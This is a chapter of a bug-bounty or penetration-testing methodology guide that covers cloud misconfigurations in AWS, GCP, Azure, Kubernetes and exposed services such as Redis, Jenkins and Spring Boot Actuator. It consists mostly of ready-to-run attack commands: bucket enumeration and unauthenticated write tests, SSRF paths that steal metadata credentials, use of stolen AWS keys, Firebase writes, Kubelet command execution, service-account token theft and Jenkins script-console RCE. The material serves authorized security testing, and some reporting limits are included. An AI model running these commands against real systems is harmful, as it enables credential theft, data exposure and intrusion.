---
title: "Part 9: Cloud & Infrastructure Misconfigurations"
nav_order: 10
layout: default
---

## PART 9: CLOUD & INFRASTRUCTURE MISCONFIGURATIONS
*Status: COMPLETE — Iteration 9*

> **The mindset:** Cloud misconfigurations are the gap between what a developer
> thought they configured and what they actually deployed. The attack surface
> is the entire public internet — S3 buckets, metadata endpoints, exposed
> dashboards, open databases — all reachable without authentication because
> someone left a door open. These bugs are often Critical with immediate impact
> and minimal exploitation complexity. The skill is knowing where to look.

---

### 9.1 AWS

---

#### 9.1.1 S3 Bucket Enumeration and Misconfiguration

🔍 **What it is:**
S3 buckets are object storage containers. A misconfigured bucket with public
read or write access exposes all stored files — or worse, allows an attacker
to upload arbitrary content.

**Finding buckets associated with a target:**
```bash
# Common naming patterns — brute-force these:
target.com
target-com
targetcom
target-assets
target-static
target-media
target-uploads
target-backup
target-logs
target-dev
target-staging
target-prod
target-data
target-files
target-images
target-cdn

# Tools:
# S3Scanner — checks if buckets exist and their permissions:
s3scanner scan --buckets-file buckets.txt
# Or single bucket:
s3scanner scan --bucket target-backup

# CloudBrute — broader cloud asset discovery:
cloudbrute -d target.com -k target -m s3 \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

# aws cli — check a specific bucket:
aws s3 ls s3://target-backup --no-sign-request
# --no-sign-request = unauthenticated access
# If it lists files → public read access

# Check for public write:
echo "test" > /tmp/test.txt
aws s3 cp /tmp/test.txt s3://target-backup/test.txt --no-sign-request
# If succeeds → public write access (Critical)

# Check bucket ACL:
aws s3api get-bucket-acl --bucket target-backup --no-sign-request

# Check bucket policy:
aws s3api get-bucket-policy --bucket target-backup --no-sign-request
```

**DNS-based bucket discovery:**
```bash
# S3 buckets often accessible via subdomain:
# target-assets.s3.amazonaws.com
# target-assets.s3.us-east-1.amazonaws.com

# During recon, flag any CNAME pointing to s3.amazonaws.com:
grep "s3.amazonaws.com" dns_cnames.txt

# Also check:
# Any subdomain returning "NoSuchBucket" → bucket name exists but unclaimed
# → S3 subdomain takeover (see 1.6)
# Any subdomain returning XML bucket listing → public ListBucket access
```

**What to look for inside accessible buckets:**
```bash
# List all objects:
aws s3 ls s3://target-backup/ --recursive --no-sign-request | head -100

# High-value file patterns:
aws s3 ls s3://target-backup/ --recursive --no-sign-request | grep -iE \
  "(\.env|config|credentials|password|secret|private|key|backup|dump|\.sql|\.bak)"

# Download interesting files:
aws s3 cp s3://target-backup/.env /tmp/target_env --no-sign-request
aws s3 cp s3://target-backup/db_backup.sql /tmp/db.sql --no-sign-request
```

**Severity assessment:**
```
Public ListBucket only (can see filenames):   Medium
Public read access (can read files):           High
Public write access (can upload files):        Critical
Public delete access:                          Critical
Sensitive data in publicly readable bucket:    Critical
```

📚 **References:**
- [S3Scanner](https://github.com/sa7mon/S3Scanner)
- [AWS CLI S3 docs](https://docs.aws.amazon.com/cli/latest/reference/s3/)

---

#### 9.1.2 SSRF → EC2 Metadata

→ Full coverage in [5.1.3 Cloud Metadata Endpoint Attacks](#513-cloud-metadata-endpoint-attacks).

**Key AWS metadata paths:**
```bash
# Instance metadata (IMDSv1 — no auth):
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data              # often contains secrets
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4   # internal IP

# After stealing credentials — validate and enumerate:
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity             # who am I?
aws iam list-attached-role-policies --role-name <role>
aws s3 ls                               # all accessible buckets
aws secretsmanager list-secrets         # stored secrets
aws ssm describe-parameters            # SSM parameter store
```

---

#### 9.1.3 Exposed AWS Keys

🔍 **Finding exposed keys (covered in 1.3.3 and 1.4 — summary here):**
```bash
# AWS key ID format: AKIA... (long-term) or ASIA... (temporary/STS)
# Find via: GitHub dorking, JS files, .env files, S3 buckets

# Validate a found key:
aws sts get-caller-identity \
  --access-key-id "AKIA..." \
  --secret-access-key "..."
# If returns account ID → key is valid → Critical

# Enumerate permissions without triggering GuardDuty (passive):
# Use aws-consoler or enumerate-iam:
python3 enumerate-iam.py \
  --access-key AKIA... \
  --secret-key ... \
  --region us-east-1

# Safe enumeration — read-only actions:
aws iam get-user
aws iam list-groups-for-user --user-name <user>
aws iam list-attached-user-policies --user-name <user>
aws s3 ls
aws ec2 describe-instances --region us-east-1
```

**In the report:**
```
Show: key ID prefix (first 10 chars only), aws sts get-caller-identity output
State: what permissions the role/user has
Do NOT: attempt to use permissions beyond read-only confirmation
Do NOT: include full secret key in report (first 4 chars + *** is sufficient)
```

---

#### 9.1.4 Cognito Misconfiguration

🔍 **AWS Cognito is a common auth provider — frequently misconfigured:**
```bash
# Find Cognito User Pool ID and Client ID:
# Usually in JS files or mobile app:
grep -rE "us-east-1_[A-Za-z0-9]+" ./js_files/   # User Pool ID
grep -rE "\"[0-9a-z]{26}\"" ./js_files/           # App Client ID

# Check if unauthenticated identities are enabled:
aws cognito-identity list-identity-pools \
  --max-results 10 \
  --region us-east-1

# Get unauthenticated credentials:
aws cognito-identity get-id \
  --account-id <account_id> \
  --identity-pool-id us-east-1:xxxxxxxx \
  --region us-east-1

aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:xxxxxxxx \
  --region us-east-1
# If returns credentials → unauthenticated access to AWS resources

# Self-registration on restricted User Pools:
aws cognito-idp sign-up \
  --client-id <app_client_id> \
  --username attacker@evil.com \
  --password Password123! \
  --region us-east-1
# Should be restricted → if succeeds → open self-registration

# Admin attribute manipulation:
aws cognito-idp update-user-attributes \
  --access-token <your_token> \
  --user-attributes Name=custom:role,Value=admin \
  --region us-east-1
# Can you set admin attributes on your own account?
```

---

### 9.2 Google Cloud Platform (GCP)

---

#### 9.2.1 GCS Bucket Misconfiguration

🔍 **Google Cloud Storage — same class as S3, different syntax:**
```bash
# Check if bucket is publicly accessible:
curl -s "https://storage.googleapis.com/target-bucket"
# XML listing → public ListObjects access

curl -s "https://storage.googleapis.com/target-bucket/config.json"
# Returns file → public read access

# gsutil (Google Cloud SDK):
gsutil ls gs://target-bucket              # list bucket (no auth)
gsutil cat gs://target-bucket/.env        # read file (no auth)
gsutil cp test.txt gs://target-bucket/    # write test (no auth)

# Find GCS buckets:
# DNS: target-assets.storage.googleapis.com
# URL: storage.googleapis.com/target-bucket
# In JS: "gs://target-bucket/" or "storage.googleapis.com/target-bucket"

# GCPBucketBrute:
python3 GCPBucketBrute.py \
  --keyword target \
  --out gcs_results.txt
```

---

#### 9.2.2 Firebase Exposed Databases

🔍 **Firebase Realtime Database and Firestore are frequently left open:**
```bash
# Firebase Realtime Database — check for open read:
curl -s "https://target-default-rtdb.firebaseio.com/.json"
# Returns JSON → entire database is publicly readable → Critical

# Common URL patterns:
https://<project-id>.firebaseio.com/.json
https://<project-id>-default-rtdb.firebaseio.com/.json
https://<project-id>-default-rtdb.firebaseio.com/users.json
https://<project-id>-default-rtdb.firebaseio.com/admin.json

# Finding Firebase project IDs:
# In JS files: firebaseConfig object
grep -rE "\"databaseURL\": \"https://[^\"]+\"" ./js_files/
grep -rE "\"projectId\": \"[^\"]+\"" ./js_files/
grep -rE "firebaseio\.com" ./js_files/

# Test write access:
curl -s -X PUT \
  "https://target-default-rtdb.firebaseio.com/test.json" \
  -d '"pwned"'
# If returns "pwned" → public write access → Critical

# Firestore (different URL pattern):
# Usually requires Firebase SDK — test via browser console:
# firebase.firestore().collection('users').get().then(s => s.forEach(d => console.log(d.data())))
```

---

#### 9.2.3 GCP Metadata Endpoint

```bash
# Via SSRF (see 5.1.3):
http://metadata.google.internal/computeMetadata/v1/
# Requires: Metadata-Flavor: Google header

# Key endpoints:
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns OAuth token for the service account → use to call GCP APIs

http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
# Instance attributes often contain: startup scripts, SSH keys, credentials
```

---

### 9.3 Microsoft Azure

---

#### 9.3.1 Azure Blob Storage Misconfiguration

🔍 **Azure equivalent of S3:**
```bash
# Check for public blob container:
curl -s "https://targetaccount.blob.core.windows.net/container?restype=container&comp=list"
# XML listing → public access enabled

# Common URL patterns:
https://<account>.blob.core.windows.net/<container>/
https://<account>.blob.core.windows.net/<container>/<file>

# Find Azure storage accounts:
# DNS: targetaccount.blob.core.windows.net
# In JS: "blob.core.windows.net"
grep -rE "[a-z0-9]+\.blob\.core\.windows\.net" ./js_files/

# BlobHunter — automated Azure blob discovery:
python3 BlobHunter.py -a targetcompany
```

---

#### 9.3.2 Azure Metadata Endpoint

```bash
# Via SSRF:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires: Metadata: true header

# Identity token:
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Returns: access_token for Azure management APIs → Critical
```

---

### 9.4 Generic Cloud Recon

---

#### 9.4.1 Cloud Asset Discovery

🔍 **Identifying cloud infrastructure during recon:**
```bash
# Identify cloud provider from DNS/headers:
# AWS: *.amazonaws.com, *.cloudfront.net, *.elb.amazonaws.com
# GCP: *.googleapis.com, *.appspot.com, *.run.app, *.cloudfunctions.net
# Azure: *.azurewebsites.net, *.blob.core.windows.net, *.azure.com
# Cloudflare: check CF-Ray header
# Heroku: *.herokudns.com

# During httpx scan — flag cloud-hosted endpoints:
cat httpx_out.txt | grep -iE "amazonaws|googleapis|azurewebsites|cloudfront|heroku"

# CloudEnum — multi-cloud enumeration:
python3 cloud_enum.py \
  -k targetcompany \
  --disable-azure    # or enable specific providers
# Checks: S3, GCS, Azure Blob, Azure websites, GCP Cloud Functions, etc.

# Enumerate cloud functions/serverless:
# AWS Lambda: *.lambda-url.<region>.on.aws
# GCP Cloud Functions: <region>-<project>.cloudfunctions.net
# Azure Functions: <name>.azurewebsites.net/api/

# Certificate search for cloud assets:
curl -s "https://crt.sh/?q=%.amazonaws.com&output=json" | \
  jq -r '.[].name_value' | grep "target" | sort -u
```

---

#### 9.4.2 Nuclei Cloud Templates

🔍 **Nuclei has purpose-built templates for cloud misconfigurations:**
```bash
# Run cloud-specific templates:
nuclei -l discovered_hosts.txt \
  -t exposures/configs/ \
  -t exposures/files/ \
  -t cloud/ \
  -severity medium,high,critical \
  -o nuclei_cloud.txt

# Specific template categories:
nuclei -u https://target.com \
  -t exposures/configs/aws-config-exposure.yaml \
  -t exposures/configs/firebase-config.yaml \
  -t exposures/configs/gcloud-config.yaml \
  -t exposures/files/gcp-service-account-file.yaml

# S3 bucket templates:
nuclei -l s3_bucket_list.txt \
  -t vulnerabilities/other/s3-bucket-public-read.yaml
```

---

### 9.5 Kubernetes and Container Misconfigurations

---

#### 9.5.1 Exposed Kubernetes Dashboard

🔍 **Kubernetes dashboard is a high-value target — often deployed without auth:**
```bash
# Common ports and paths:
http://target.com:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
http://target.com:30000/  # NodePort default
https://target.com:6443/  # API server

# Check via recon (httpx on non-standard ports):
httpx -l dns_resolved.txt -p 8001,8080,8443,6443,10250,10255 \
  -path "/api/v1/pods" \
  -mc 200 \
  -silent

# Kubernetes API server — unauthenticated access:
curl -sk https://target-k8s.target.com:6443/api/v1/pods
# Returns pod list → unauthenticated API access → Critical

curl -sk https://target-k8s.target.com:6443/api/v1/namespaces/default/secrets
# Returns secrets → Critical
```

---

#### 9.5.2 Unauthenticated Kubelet API

🔍 **Kubelet runs on every node, manages containers. Port 10250/10255:**
```bash
# Port 10255 — read-only (no auth by default in older configs):
curl -sk http://target-node:10255/pods      # list pods
curl -sk http://target-node:10255/metrics   # metrics with info leak

# Port 10250 — full API (if anonymous auth enabled):
curl -sk https://target-node:10250/pods
curl -sk https://target-node:10250/run/default/<pod-name>/<container-name> \
  -d "cmd=id"
# Execute commands in any container → RCE → Critical

# Find nodes via:
# SSRF to cloud metadata → get internal node IPs
# kubectl get nodes (if API access obtained)
# Shodan: port:10255 kubernetes
```

---

#### 9.5.3 SSRF to Internal Kubernetes Services

```bash
# If you have SSRF, probe Kubernetes internal services:
# Kubernetes API (via service account):
?url=http://kubernetes.default.svc/api/v1/namespaces/default/secrets

# Internal services via DNS:
?url=http://service-name.namespace.svc.cluster.local/

# Environment variables leak cluster info:
# SSRF → http://169.254.169.254/latest/user-data
# Often contains: kubeconfig, service account tokens, cluster endpoints

# Service account token (if in pod):
?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
?url=file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token to authenticate to K8s API:
curl -sk https://kubernetes.default.svc/api/v1/pods \
  -H "Authorization: Bearer <token>"
```

---

### 9.6 Exposed Services and Panels

---

#### 9.6.1 Exposed Admin Panels and Internal Tools

🔍 **Found via recon (Part 1) — testing approach:**
```bash
# High-value services to look for during httpx + port scan:

# Elasticsearch (unauthenticated by default pre-8.x):
curl -s http://target.com:9200/_cat/indices?v    # list all indices
curl -s http://target.com:9200/_all/_search      # search all data
curl -s http://target.com:9200/_cluster/health   # cluster info

# Kibana (Elasticsearch UI):
http://target.com:5601/  # login page or open access
# If open: full Elasticsearch access via UI

# Redis (unauthenticated by default):
redis-cli -h target.com -p 6379 ping        # PONG = accessible
redis-cli -h target.com info                # full server info
redis-cli -h target.com keys '*'            # all keys
redis-cli -h target.com get 'user:session:*' # session data

# MongoDB (unauthenticated by default pre-3.6):
mongo target.com:27017 --eval "db.adminCommand({listDatabases:1})"
# Or via HTTP interface (if enabled):
curl http://target.com:28017/

# Grafana (default admin:admin):
http://target.com:3000/
# If login works: access dashboards, datasources (may include DB credentials)

# Jenkins (often no auth or weak auth):
http://target.com:8080/
# Script console at /script → Groovy RCE:
# println("id".execute().text)

# Jupyter Notebook:
http://target.com:8888/
# If no token required → full Python execution → RCE

# Prometheus metrics:
http://target.com:9090/metrics    # often leaks internal IPs, service names
http://target.com:9090/targets    # shows all monitored services
```

---

#### 9.6.2 Exposed .git Directories

→ Covered in [1.5.3](#153-backup-and-configuration-file-discovery).

Quick reference:
```bash
# Check:
curl -s https://target.com/.git/HEAD
# "ref: refs/heads/main" → exposed

# Dump:
git-dumper https://target.com/.git ./dumped_repo
cd dumped_repo
git log --oneline    # full commit history
git show HEAD        # latest code
grep -r "password\|secret\|key" .  # find secrets in source
```

---

#### 9.6.3 Exposed .env and Config Files

→ Covered in [1.5.3](#153-backup-and-configuration-file-discovery).

Most common finds:
```bash
# Test these on every target:
/.env
/.env.local
/.env.production
/.env.staging
/config.json
/config.yml
/appsettings.json
/web.config
/database.yml
/.aws/credentials
/docker-compose.yml    # often contains env vars with credentials
```

---

#### 9.6.4 Exposed Debugging Interfaces

🔍 **Developer tools left on in production:**
```bash
# Laravel Debug Mode (PHP):
# Error page reveals: full stack trace, environment variables, config values
# Trigger: send malformed request
curl -s "https://target.com/api/test" -d "invalid={"
# If Laravel debug page appears → full .env file exposed in page

# Django Debug Mode (Python):
# Same — trigger 404 or 500, look for Django debug page
curl -s "https://target.com/nonexistent/"
# If Django debug page → settings, installed apps, URL patterns exposed

# Spring Boot Actuator endpoints (Java):
curl -s https://target.com/actuator                   # list all endpoints
curl -s https://target.com/actuator/env               # environment variables
curl -s https://target.com/actuator/health            # health info
curl -s https://target.com/actuator/info              # app info
curl -s https://target.com/actuator/beans             # all Spring beans
curl -s https://target.com/actuator/mappings          # all URL mappings
curl -s https://target.com/actuator/logfile           # application logs
# /actuator/env often contains: DB passwords, API keys, cloud credentials

# PHP info page:
https://target.com/phpinfo.php
https://target.com/info.php
https://target.com/test.php
# Exposes: PHP config, loaded extensions, environment variables, server info

# Express.js development mode:
# Stack traces in error responses
# Check: X-Powered-By: Express header + verbose error on /nonexistent

# Webpack bundle analyzer (development build in production):
https://target.com/report.html  # or /webpack-bundle-analyzer
# Lists all source files and their sizes → source map intel
```

**Nuclei templates for exposed services:**
```bash
nuclei -l httpx_out.txt \
  -t exposures/ \
  -t technologies/ \
  -t misconfiguration/ \
  -severity medium,high,critical \
  -o nuclei_exposures.txt
```

---

### Part 9 — Complete Cloud & Infrastructure Checklist

```
AWS
□ S3 bucket enumeration: naming patterns + S3Scanner
□ DNS CNAME to s3.amazonaws.com → check for takeover or public access
□ Bucket found: aws s3 ls --no-sign-request (read?) and cp (write?)
□ Bucket contents: scan for .env, config, credentials, backups, SQL dumps
□ EC2 metadata via SSRF: /latest/meta-data/iam/security-credentials/
□ Exposed AWS keys in JS/GitHub: validate with sts get-caller-identity
□ Cognito: open self-registration, unauthenticated identity pool credentials

GCP
□ GCS buckets: storage.googleapis.com/<bucket> → public access?
□ Firebase: <project>.firebaseio.com/.json → open read/write?
□ Find Firebase project ID in JS files
□ GCP metadata via SSRF: metadata.google.internal → service account token

AZURE
□ Azure Blob: <account>.blob.core.windows.net → public container listing?
□ Azure metadata via SSRF: 169.254.169.254/metadata/identity
□ BlobHunter for storage account discovery

KUBERNETES
□ Kubernetes dashboard: ports 8001, 30000, 443
□ API server: port 6443 → unauthenticated access to pods/secrets?
□ Kubelet: port 10255 (read-only) / 10250 (exec) → anonymous auth?
□ SSRF to kubernetes.default.svc → list secrets
□ Service account token via SSRF: file:///var/run/secrets/...

EXPOSED SERVICES
□ Elasticsearch port 9200: _cat/indices, _all/_search
□ Redis port 6379: ping, keys, get
□ MongoDB port 27017: unauthenticated listDatabases
□ Grafana port 3000: default admin:admin credentials
□ Jenkins port 8080: unauthenticated + script console RCE
□ Jupyter port 8888: no token required → Python RCE
□ Prometheus port 9090: targets endpoint → internal service map

EXPOSED FILES & PANELS
□ /.git/HEAD → dump repo with git-dumper
□ /.env and variants → credentials
□ Spring Boot /actuator/env → environment variables
□ Laravel/Django debug mode → full config exposure
□ PHP info pages: phpinfo.php, info.php
□ Nuclei: exposures/ + misconfiguration/ templates on all hosts
```

📚 **Part 9 Master References:**
- [S3Scanner](https://github.com/sa7mon/S3Scanner)
- [CloudEnum](https://github.com/initstring/cloud_enum)
- [GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute)
- [BlobHunter](https://github.com/Sysdig/BlobHunter)
- [enumerate-iam](https://github.com/andresriancho/enumerate-iam)
- [HackTricks — Cloud Pentesting](https://cloud.hacktricks.xyz)
- [AWS Security Tools](https://github.com/toniblyx/my-arsenal-of-aws-security-tools)
- [flaws.cloud](http://flaws.cloud) — AWS misconfiguration practice
- [flaws2.cloud](http://flaws2.cloud) — AWS attacker/defender paths
- [thunder CTF](https://thunder-ctf.cloud) — GCP misconfiguration practice
- [Nuclei cloud templates](https://github.com/projectdiscovery/nuclei-templates/tree/main/cloud)

---

